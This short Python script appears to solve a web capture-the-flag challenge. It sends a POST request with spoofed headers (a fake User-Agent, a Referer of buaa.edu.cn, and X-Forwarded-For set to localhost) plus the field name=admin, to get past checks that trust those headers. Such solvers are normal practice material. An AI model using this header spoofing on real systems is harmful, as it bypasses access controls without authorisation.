import httpx
import sys

target = f"http://{sys.argv[1]}:{sys.argv[2]}/"

headers = {
    "User-Agent": "or4ngeBrowser",
    "Referer": "https://buaa.edu.cn",
    "X-Forwarded-For": "localhost",
    "Content-Type": "application/x-www-form-urlencoded"
}

data = "name=admin"

res = httpx.post(target, headers=headers, data=data)
print(res.text)
